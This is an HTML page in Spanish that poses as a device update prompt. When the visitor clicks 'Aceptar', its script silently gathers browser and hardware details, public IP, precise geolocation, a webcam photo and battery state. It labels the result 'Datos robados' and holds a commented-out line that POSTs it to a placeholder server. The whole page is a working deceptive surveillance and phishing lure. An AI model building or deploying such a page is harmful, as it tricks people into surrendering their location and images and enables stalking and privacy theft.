<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        button {
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #status {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Actualizando tu dispositivo</h2>
        <p>Haz clic para continuar.</p>
        <button id="btn">Aceptar</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('btn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.textContent = "Recopilando datos...";
            
            let data = {};

            // 1. Obtener información básica del dispositivo y red
            try {
                data.userAgent = navigator.userAgent;
                data.platform = navigator.platform;
                data.language = navigator.language;
                data.hardwareConcurrency = navigator.hardwareConcurrency; // Núcleos de CPU
                data.deviceMemory = navigator.deviceMemory; // RAM aproximada
                data.connection = navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null;
                
                // Intentar obtener dirección IP pública (usando un servicio externo)
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    data.publicIP = ipData.ip;
                } catch (e) {
                    data.publicIP = "No disponible";
                }
            } catch (e) {
                console.error("Error obteniendo info básica", e);
            }

            // 2. Geolocalización
            if ("geolocation" in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    data.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                } catch (e) {
                    data.location = "Denegada o error";
                }
            } else {
                data.location = "No soportada";
            }

            // 3. Cámara (foto rápida)
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
video.srcObject = stream;
                    video.play();
                    
                    await new Promise(resolve => {
                        video.addEventListener('loadeddata', resolve, { once: true });
                    });

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    data.photo = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Detener la cámara
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    data.camera = "Denegada o error";
                }
            } else {
                data.camera = "No soportada";
            }

            // 4. Batería (si está disponible)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level,
                        charging: battery.charging
                    };
                } catch (e) {
                    data.battery = "No disponible";
                }
            }

            // 5. Almacenamiento local (para identificar si ya ha visitado antes)
            data.storageQuota = navigator.storage ? 
                (await navigator.storage.estimate()).quota : "No disponible";

            // Mostrar resultados en consola y en pantalla (opcionalmente)
            console.log("Datos robados:", data);
            status.textContent = "¡Listo! Datos recopilados.";
            
            // Opcional: Enviar a un servidor remoto
            // fetch('https://tu-servidor.com/recibir', { method: 'POST', body: JSON.stringify(data) });
        });
    </script>
</body>
</html>
